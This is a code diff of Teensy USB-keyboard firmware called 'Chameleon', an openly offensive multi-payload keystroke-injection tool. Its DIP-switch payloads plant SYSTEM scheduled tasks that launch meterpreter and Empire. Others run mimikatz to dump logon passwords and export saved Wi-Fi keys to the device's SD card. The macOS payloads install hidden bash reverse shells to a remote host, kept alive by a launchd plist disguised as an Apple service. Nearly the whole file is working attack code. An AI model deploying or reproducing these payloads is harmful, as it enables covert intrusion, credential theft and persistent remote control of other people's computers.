@@ -1,16 +1,15 @@
 /*
 
-"Peensy" - that's a Teensy v2.0 with an SD card and 3 pin DIP switch.
+Chameleon, by Alex McCulloch. 
 
-This Teensy payload was developed to reliably backdoor Windows systems with powershell installed.
-Current payload is an architecture dependent, scheduled reverse meterpreter powershell script - planted in %WINDIR%.
-The payload then copies a binary from the Teensy SD, executes it, and copies the resultant file back to the Teensy.
+A multipayload rubber ducky clone. 
 
-More info can be found in the README and blog post:
+Started off as a modification of the Peensy project, turned into more of its own thing. 
+https://github.com/offensive-security/hid-backdoor-peensy, 
+https://www.offensive-security.com/offsec/advanced-teensy-penetration-testing-payloads/
 
-http://www.offensive-security.com/offsec/advanced-teensy-penetration-testing-payloads
-
-Modified by exl4
+Ported some ducky scripts from Hak5. https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads. 
+And ported some output code from the Kautilya project. https://github.com/samratashok/Kautilya
 
 */
 
@@ -28,7 +27,6 @@ SdFile file;
  unsigned int p1 = 10; 
  unsigned int p2 = 9;
  unsigned int p3 = 8;
- int dipPins[] = {8, 9, 10};
 
 // Teensy has LED on 11
 const int led_pin = 11; 
@@ -49,10 +47,8 @@ void wait_for_drivers(unsigned int speed)
   delay(speed);
 }
 
-// NUM, SCROLL, CAPS Led keys checking. We only use NUMLOCK in this sketch. 
+// NUM Led keys checking. 
 int ledkeys(void) {return int(keyboard_leds);}
-bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
-bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}
 bool is_num_on(void) {return ((ledkeys() & 1) == 1) ? true : false;}
 
 void unpress_key(void)
@@ -93,9 +89,9 @@ void alt_f4(void)
   unpress_key();
 }
 
-// Attempts to open a UAC enabled prompt (reps) times, with (millisecs) milliseconds between each attempt. 
-// Minimal reasonable values are : secure_prompt(3,700);
-bool secure_prompt(unsigned int reps, unsigned int millisecs)
+// Attempts to open an admin cmd prompt (reps) times, with (millisecs) milliseconds between each attempt. 
+// Minimal reasonable values are : cmd_admin(3,700);
+bool cmd_admin(unsigned int reps, unsigned int millisecs)
 {
   make_sure_numlock_is_off();
   delay(700);
@@ -104,7 +100,7 @@ bool secure_prompt(unsigned int reps, unsigned int millisecs)
   Keyboard.set_modifier(0);
   Keyboard.send_now();
   delay(1500);
-  Keyboard.print("cmd.exe");
+  Keyboard.print("cmd");
   delay(1500);
   Keyboard.set_modifier(MODIFIERKEY_CTRL);
   Keyboard.send_now();
@@ -152,7 +148,7 @@ void create_click_numlock_win()
   Keyboard.println(F("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{NUMLOCK}\"' > numlock.vbs"));
   delay(400);
   Keyboard.println(F("cscript numlock.vbs"));
-  //delay(2000);
+  delay(200);
 }
 
 // Minimises all windows 3 times with (sleep) milliseconds in between. used on failure of CMD opening.
@@ -185,14 +181,13 @@ void make_sure_numlock_is_off(void)
   }
 }
 
-
 // Preforms a Windows copy operation from the attached FAT formatted SD drive to the target machine. The drive VOLUME NAME is also taken as a parameter. For example:
 // wincopy_from_sd_card("hstart64.exe" ,"hstart.exe","PAYLOAD");
 // Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
 bool wincopy_from_sd_card(char *source,char *destination, char *volumename, unsigned int reps, unsigned int millisecs)
 {
   delay(200);
-  make_sure_numlock_is_off();
+  //make_sure_numlock_is_off();
   Keyboard.print(F("for /F \%i in ('WMIC logicaldisk where \"DriveType=2\" list brief ^| find \""));
   Keyboard.print(volumename);
   Keyboard.print(F("\"') do copy /Y \%i\\"));
@@ -200,97 +195,31 @@ bool wincopy_from_sd_card(char *source,char *destination, char *volumename, unsi
   Keyboard.print(" ");
   Keyboard.println(destination);
   delay(200);
-  Keyboard.println(F("cscript numlock.vbs"));
-  delay(700);
-  return check_for_numlock_sucess_teensy(reps,millisecs);
-}
-
-// Preforms a Windows copy operation from the target machine to the attached FAT formatted SD drive. The drive VOLUME NAME is also taken as a parameter. For example:
-// wincopy_from_sd_card("c:\\windows\\file.exe" ,"loot.exe","PAYLOAD");
-// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
-bool wincopy_to_sd_card(char *source,char *destination, char *volumename, unsigned int reps, unsigned int millisecs)
-{
-  delay(200);
-  make_sure_numlock_is_off();
-  Keyboard.print(F("for /F \%i in ('WMIC logicaldisk where \"DriveType=2\" list brief ^| find \""));
-  Keyboard.print(volumename);
-  Keyboard.print(F("\"') do copy /Y "));
-  Keyboard.print(source);
-  Keyboard.print(F(" \%i\\"));
-  Keyboard.println(destination);
-  delay(200);
-  delay(700);
-  Keyboard.println(F("cscript numlock.vbs"));
-  delay(700);
-  return check_for_numlock_sucess_teensy(reps,millisecs);
+  //Keyboard.println(F("cscript numlock.vbs"));
+  //delay(700);
+  //return check_for_numlock_sucess_teensy(reps,millisecs);
 }
 
 // returns 1 on successful Teensy SD card init. 
-bool init_sd_card(void) { return (card.init(SPI_HALF_SPEED, sd_chip_select) && volume.init(&card) && root.openRoot(&volume)) ? true : false;}
-
-// A function to check if Windows has mounted a drive with VOLUMENAME.
-// Presses numlock on success.
-// Minimal reasonable values depend on file size and USB speed. For a small file: win_check_sd_card_mounted_powershell(4,700);
-// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
-bool win_check_sd_card_mounted_powershell(char *volumename, unsigned int reps, unsigned int millisecs)
-{
-  delay(200);
-  make_sure_numlock_is_off();
-  delay(400);
-  Keyboard.println(F("powershell"));
-  delay(5000);
-  Keyboard.print(F("if (Get-WmiObject -Class Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.VolumeName -eq \""));
-  Keyboard.print(volumename);
-  Keyboard.println(F("\")}) {Write-host hola;$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{NUMLOCK}')}"));
-  delay(500);
-  Keyboard.println(F("exit"));
-  delay(500);
-  return check_for_numlock_sucess_teensy(reps,millisecs);
-}  
-
-// Initialise the DIP switch pins.
-void init_dip_switch(void)
-{
-  pinMode(p1, INPUT_PULLUP);
-  pinMode(p2, INPUT_PULLUP);
-  pinMode(p3, INPUT_PULLUP);
-}
-
-//Read state from DIP Switch
-byte address()
-{
-  int i,j=0;
- 
-  //Get the switches state
-   for(i=0; i<=2; i++)
-   {
-     j = (j << 1) | digitalRead(dipPins[i]);   // read each input pin
-   }
-   return j; //return address
-}
+bool init_sd_card(void) { return (card.init(SPI_HALF_SPEED, sd_chip_select) && volume.init(&card) && root.openRoot(&volume)) ? true : false;}  
 
 void initVictim(void)
 {
   if (!init_sd_card()){Serial.println("SDCARD FAIL");}
-
   wait_for_drivers(2000);
-  // delay(2000);
-  // minimise_windows();
   delay(200);
-  secure_prompt(3,500);
-  /*
-  while (!secure_prompt(3,500))
+  
+  while (!cmd_admin(3,500))
   {
-    reset_windows_desktop(2000);
+    delay(2000);
+    minimise_windows();
   }
-  */
+
   delay(500);
 }
 
 void toggleDefender(void)
 {
-  // make_sure_numlock_is_off();
-  // delay(700);
   Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
@@ -344,18 +273,17 @@ void performMimikatz(void)
   // Dump contents to file
   Keyboard.println(F("privilege::debug"));
   delay(200);
-  
   Keyboard.println(F("log \"C:\\other.log\""));
   delay(200);
-
   Keyboard.println(F("sekurlsa::logonpasswords"));
   delay(1000);
-  
   Keyboard.println(F("exit"));
   delay(700);
   
   // Move file to SD card with date
-  Keyboard.println(F("Move-Item \"C:\\other.log\" \"$letter\\pwn$((get-date).tostring(\"MMddyyyyHHmmss\")).txt\""));
+  Keyboard.println(F("$filename = $env:COMPUTERNAME + \"-Passwords$((get-date).tostring(\"MMddyyyyHHmmss\")).txt\""));
+  delay(700);
+  Keyboard.println(F("Move-Item \"C:\\other.log\" \"$letter\\$filename\""));
   delay(200);
   
   // Delete mimimkatz 
@@ -367,48 +295,47 @@ void performMimikatz(void)
   delay(200);
 }
 
+// Initialise the DIP switch pins.
+void init_dip_switch(void)
+{
+  pinMode(p1, INPUT_PULLUP);
+  pinMode(p2, INPUT_PULLUP);
+  pinMode(p3, INPUT_PULLUP);
+}
+
 // Main body of execution
 void setup(void)
 {
   Serial.begin(9600);
-  // blink_fast(10,80);
-  // delay(1000);
+  init_dip_switch();
 
-  // init_dip_switch();
-
-  //init and read dip switch positions
-  int i;
-  for(i = 0; i<=2; i++)
-  {
-    pinMode(dipPins[i], INPUT_PULLUP);     
-  }
-
-  int dipSwitchPos = address();
-
+  // Dip switch 001 - Windows, Configure and start meterpreter and Empire sessions
   if (digitalRead(p3) && digitalRead(p2) && !digitalRead(p1)) 
-  //if (dipSwitchPos == 110)
   {
     initVictim();
 
     // startEmpire
     wincopy_from_sd_card("PE.bat" ,"%WINDIR%\\PE.bat","PEENSY",3,200);
-    //delay(700);
+    delay(700);
     Keyboard.println(F(""));
     Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Diag /tr \"'cmd' /c start '' '%WINDIR%\\PE.bat'\""));
     delay(300);
     Keyboard.println(F("schtasks /run /tn Diag"));
+    delay(300);
 
     // start meterpreter
     wincopy_from_sd_card("msf.bat" ,"%WINDIR%\\msf.bat","PEENSY",3,200);
-    //delay(700);
+    delay(700);
     Keyboard.println(F(""));
     Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Maint /tr \"'cmd' /c start '' '%WINDIR%\\msf.bat'\""));
     delay(300);
     Keyboard.println(F("schtasks /run /tn Maint"));
+    delay(300);
 
     alt_f4();
   }
 
+  // Dip switch 010 - Windows, mimikatz dump
   if (digitalRead(p3) && !digitalRead(p2) && digitalRead(p1))  
   {
     initVictim();
@@ -418,12 +345,134 @@ void setup(void)
     toggleDefender();
   }
 
-  //if (!digitalRead(p3)) 
-  //{
-    // Do mac payload...
-  //}
+  // Dip switch 011 - Windows, dump all saved wifi passwords
+  if (digitalRead(p3) && !digitalRead(p2) && !digitalRead(p1)) 
+  {
+    initVictim();
 
-  // Blink light to show finished running
+    delay(700);
+    Keyboard.println(F("powershell"));
+    delay(700);
+    Keyboard.println(F("$filename = $env:COMPUTERNAME + \"-WLAN-Keys$((get-date).tostring(\"MMddyyyyHHmmss\")).txt\""));
+    delay(700);
+    Keyboard.println(F("netsh wlan show profiles | Select-String -Pattern \"All User Profile\" | foreach {$_.ToString()} | foreach {$_.Replace(\"    All User Profile     : \",$null)} | foreach {netsh wlan show profiles name=\"$_\" key=clear} > $env:temp\\$filename"));
+    delay(2000);
+    Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='PEENSY'\" | select -expand driveletter"));
+    delay(200);
+    Keyboard.println(F("Move-Item \"$env:temp\\$filename\" \"$letter\\$filename\""));
+    delay(200);
+    Keyboard.println(F("exit"));
+    delay(1000);
+    
+    alt_f4();
+  }
+
+  // Dip switch 100 - Mac, configure root backdoor
+  if (!digitalRead(p3) && digitalRead(p2) && digitalRead(p1)) 
+  {
+    delay(2000);
+    Keyboard.println(F(""));
+    delay(400);
+    Keyboard.println(F("mount -uw /"));
+    delay(2000);
+    Keyboard.println(F("mkdir /Library/.hidden"));
+    delay(200);
+    Keyboard.println(F("echo '#!/bin/bash"));
+    Keyboard.println(F("bash -i >& /dev/tcp/1.1.1.1/8080 0>&1")); //Replace 1.1.1.1/8080 with ip/port of your server listening with netcat
+    Keyboard.println(F("wait' > /Library/.hidden/connect.sh"));
+    delay(500);
+    Keyboard.println(F("chmod +x /Library/.hidden/connect.sh"));
+    delay(200);
+    Keyboard.println(F("mkdir /Library/LaunchDaemons"));
+    delay(200);
+    Keyboard.println(F("echo '<plist version=\"1.0\">"));
+    Keyboard.println(F("<dict>"));
+    Keyboard.println(F("<key>Label</key>"));
+    Keyboard.println(F("<string>com.apples.services</string>"));
+    Keyboard.println(F("<key>ProgramArguments</key>"));
+    Keyboard.println(F("<array>"));
+    Keyboard.println(F("<string>/bin/sh</string>"));
+    Keyboard.println(F("<string>/Library/.hidden/connect.sh</string>"));
+    Keyboard.println(F("</array>"));
+    Keyboard.println(F("<key>RunAtLoad</key>"));
+    Keyboard.println(F("<true/>"));
+    Keyboard.println(F("<key>StartInterval</key>"));
+    Keyboard.println(F("<integer>60</integer>"));
+    Keyboard.println(F("<key>AbandonProcessGroup</key>"));
+    Keyboard.println(F("<true/>"));
+    Keyboard.println(F("</dict>"));
+    Keyboard.println(F("</plist>' > /Library/LaunchDaemons/com.apples.services.plist"));
+    delay(500);
+    Keyboard.println(F("chmod 600 /Library/LaunchDaemons/com.apples.services.plist"));
+    delay(200);
+    Keyboard.println(F("launchctl load /Library/LaunchDaemons/com.apples.services.plist"));
+    delay(1000);
+    Keyboard.println(F("shutdown -h now"));
+  }
+
+  // Dip switch 101 - Mac, configure user backdoor
+  if (!digitalRead(p3) && digitalRead(p2) && !digitalRead(p1)) 
+  {
+    delay(1000);
+
+    Keyboard.set_modifier(MODIFIERKEY_GUI);
+    Keyboard.set_key1(KEY_SPACE);
+    Keyboard.send_now();
+    delay(200);
+    unpress_key();
+
+    delay(3000);
+    Keyboard.print("terminal");
+    delay(3000);
+    
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+    delay(200);
+    unpress_key();
+    delay(200);
+
+    delay(3000);
+    Keyboard.println(F("mkdir ~/Library/.hidden"));
+    delay(200);
+    Keyboard.println(F("echo '#!/bin/bash"));
+    Keyboard.println(F("bash -i >& /dev/tcp/1.1.1.1/8080 0>&1")); //Replace 1.1.1.1/8080 with ip/port of your server listening with netcat
+    Keyboard.println(F("wait' > ~/Library/.hidden/connect.sh"));
+    delay(500);
+    Keyboard.println(F("chmod +x ~/Library/.hidden/connect.sh"));
+    delay(200);
+    Keyboard.println(F("mkdir ~/Library/LaunchAgents"));
+    delay(200);
+    Keyboard.println(F("echo '<plist version=\"1.0\">"));
+    Keyboard.println(F("<dict>"));
+    Keyboard.println(F("<key>Label</key>"));
+    Keyboard.println(F("<string>com.apples.services</string>"));
+    Keyboard.println(F("<key>ProgramArguments</key>"));
+    Keyboard.println(F("<array>"));
+    Keyboard.println(F("<string>/bin/sh</string>"));
+    Keyboard.println(F("<string>'$HOME'/Library/.hidden/connect.sh</string>"));
+    Keyboard.println(F("</array>"));
+    Keyboard.println(F("<key>RunAtLoad</key>"));
+    Keyboard.println(F("<true/>"));
+    Keyboard.println(F("<key>StartInterval</key>"));
+    Keyboard.println(F("<integer>300</integer>"));
+    Keyboard.println(F("<key>AbandonProcessGroup</key>"));
+    Keyboard.println(F("<true/>"));
+    Keyboard.println(F("</dict>"));
+    Keyboard.println(F("</plist>' > ~/Library/LaunchAgents/com.apples.services.plist"));
+    delay(200);
+    Keyboard.println(F("chmod 600 ~/Library/LaunchAgents/com.apples.services.plist"));
+    delay(200);
+    Keyboard.println(F("launchctl load ~/Library/LaunchAgents/com.apples.services.plist"));
+    delay(200);
+
+    Keyboard.set_modifier(MODIFIERKEY_GUI);
+    Keyboard.set_key1(KEY_Q);
+    Keyboard.send_now();
+    delay(100);
+    unpress_key();
+  }
+
+  // Blink light to show finished
   blink_fast(150,30);
 }
 
